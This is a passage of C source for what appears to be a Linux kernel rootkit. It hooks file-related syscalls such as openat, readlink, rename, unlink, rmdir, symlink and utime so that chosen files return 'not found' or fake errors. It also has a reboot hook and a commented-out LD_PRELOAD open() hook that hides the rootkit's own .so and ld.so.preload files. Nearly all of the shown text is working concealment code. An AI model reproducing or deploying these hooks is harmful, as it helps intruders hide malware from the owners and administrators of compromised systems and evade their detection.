asmlinkage int hooked_openat(int dirfd, const char *pathname, int flags, mode_t mode) {

	if (should_hook_file(pathname)) {
		DEBUG_printk1("Denied openat()\n");
		return -ENOENT;
	}

	return orig_openat(dirfd, pathname, flags, mode);
}

asmlinkage int hooked_name_to_handle_at(int dirfd, const char *pathname, struct file_handle *handle, int *mount_id, int flags) {

	if (should_hook_file(pathname)) {
		DEBUG_printk1("Denied name_to_handle_at()\n");
		return -ENOENT;
	}

	return orig_name_to_handle_at(dirfd, pathname, handle, mount_id, flags);
}

//asmlinkage int hooked_open_by_handle_at(int mount_fd, struct file_handle *handle, int flags) {}

//asmlinkage long hooked_ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data) {}

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 0)
asmlinkage int hooked_query_module(const char *name, int which, void *buf, size_t bufsize, size_t *ret) {}
#endif

//asmlinkage ssize_t hooked_read(int fd, void *buf, size_t count) {}

//asmlinkage int hooked_readdir(unsigned int fd, struct old_linux_dirent *dirp, unsigned int count) {}

asmlinkage ssize_t hooked_readlink(const char *pathname, char *buf, size_t bufsiz) {

	if (should_hook_file(pathname)) {
		return -ENOENT;
	}

	return orig_readlink(pathname, buf, bufsiz);
}

asmlinkage ssize_t hooked_readlinkat(int dirfd, const char *pathname, char *buf, size_t bufsiz) {

	if (should_hook_file(pathname)) {
		return -ENOENT;
	}

	return orig_readlinkat(dirfd, pathname, buf, bufsiz);
}

/**
 * Always return failure.
 */
asmlinkage int hooked_reboot(int cmd) {
//#ifdef ALLOW_MODULE_UNLOAD
	return orig_reboot(cmd);
//#endif
	return -EFAULT;
}

//asmlinkage ssize_t hooked_recv(int sockfd, void *buf, size_t len, int flags) {}
//asmlinkage ssize_t hooked_recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen) {}
//asmlinkage ssize_t hooked_recvmsg(int sockfd, struct msghdr *msg, int flags) {}
//asmlinkage int hooked_recvmmsg(int sockfd, struct mmsghdr *msgvec, unsigned int vlen, int flags, struct timespec *timeout) {}

asmlinkage int hooked_rename(const char *oldpath, const char *newpath) {

	if (should_hook_file(oldpath)) {
		return -ENOENT;
	}
	if (should_hook_file(newpath)) {
		return -ENOSPC;
	}

	return orig_rename(oldpath, newpath);
}

asmlinkage int hooked_renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath) {

	if (should_hook_file(oldpath)) {
		return -ENOENT;
	}
	if (should_hook_file(newpath)) {
		return -ENOSPC;
	}

	return orig_renameat(olddirfd, oldpath, newdirfd, newpath);
}

asmlinkage int hooked_renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags) {

	if (should_hook_file(oldpath)) {
		return -ENOENT;
	}
	if (should_hook_file(newpath)) {
		return -ENOSPC;
	}

	return orig_renameat2(olddirfd, oldpath, newdirfd, newpath, flags);
}

asmlinkage int hooked_rmdir(const char *pathname) {

	if (should_hook_file(pathname)) {
		return -ENOENT;
	}

	return orig_rmdir(pathname);
}

/*
asmlinkage ssize_t hooked_send(int sockfd, const void *buf, size_t len, int flags) {

	//TODO

	return orig_send(sockfd, buf, len, flags);
}
*/

asmlinkage ssize_t hooked_sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen) {

	//TODO

	return orig_sendto(sockfd, buf, len, flags, dest_addr, addrlen);
}

asmlinkage ssize_t hooked_sendmsg(int sockfd, const struct msghdr *msg, int flags) {

	//TODO

	return orig_sendmsg(sockfd, msg, flags);
}

//asmlinkage int hooked_sendmmsg(int sockfd, struct mmsghdr *msgvec, unsigned int vlen, int flags) {}

//asmlinkage int hooked_getsockopt(int sockfd, int level, int optname, void *optval, socklen_t *optlen) {}
//asmlinkage int hooked_setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen) {}

//asmlinkage int hooked_shutdown(int sockfd, int how) {}

//asmlinkage int hooked_socketcall(int call, unsigned long *args) {}

asmlinkage int hooked_swapon(const char *path, int swapflags) {
	
	if (should_hook_file(path)) {
		return -ENOENT;
	}

	return orig_swapon(path, swapflags);
}

asmlinkage int hooked_swapoff(const char *path) {

	if (should_hook_file(path)) {
		return -ENOENT;
	}

	return orig_swapoff(path);
}

asmlinkage int hooked_symlink(const char *target, const char *linkpath) {

	if (should_hook_file(target)) {
		return -ENOENT;
	}
	if (should_hook_file(linkpath)) {
		return -ENOENT;
	}

	return orig_symlink(target, linkpath);
}

asmlinkage int hooked_symlinkat(const char *target, int newdirfd, const char *linkpath) {

	if (should_hook_file(target)) {
		return -ENOENT;
	}
	if (should_hook_file(linkpath)) {
		return -ENOENT;
	}

	return orig_symlinkat(target, newdirfd, linkpath);
}

asmlinkage int hooked_unlink(const char *pathname) {

	if (should_hook_file(pathname)) {
		return -ENOENT;
	}

	return orig_unlink(pathname);
}

asmlinkage int hooked_unlinkat(int dirfd, const char *pathname, int flags) {

	if (should_hook_file(pathname)) {
		return -ENOENT;
	}

	return orig_unlinkat(dirfd, pathname, flags);
}

asmlinkage int hooked_utime(const char *filename, const struct utimbuf *times) {

	if (should_hook_file(filename)) {
		return -ENOENT;
	}

	return orig_utime(filename, times);
}

asmlinkage int hooked_utimes(const char *filename, const struct timeval times[2]) {

	if (should_hook_file(filename)) {
		return -ENOENT;
	}

	return orig_utimes(filename, times);
}

asmlinkage int hooked_utimensat(int dirfd, const char *pathname, const struct timespec times[2], int flags) {

	if (should_hook_file(pathname)) {
		return -ENOENT;
	}

	return orig_utimensat(dirfd, pathname, times, flags);
}

//asmlinkage int hooked_futimens(int fd, const struct timespec times[2]) {}

//asmlinkage ssize_t hooked_write(int fd, const void *buf, size_t count) {}













/*


// ==========================================================================================
//								Hooked fcntl.h functions
// ==========================================================================================
int open(const char *pathname, int flags, ...) {

	// If trying to operate on any file that matches our .so file or ld.so.preload
	if (suspicious_file_pathname(pathname)){

		// If would create the file, fake some other error
		if (flags & O_CREAT) {
			errno = ENOMEM;
		}
		// Pretend file does not exist
		else {
			errno = ENOENT;
		}

		return -1;
	}

	va_list args;
	va_start (args, flags);
	mode_t mode = va_arg (args, int);
	va_end (args);
	
	// Else process normally
	return orig_open(pathname, flags, mode);
}


*/

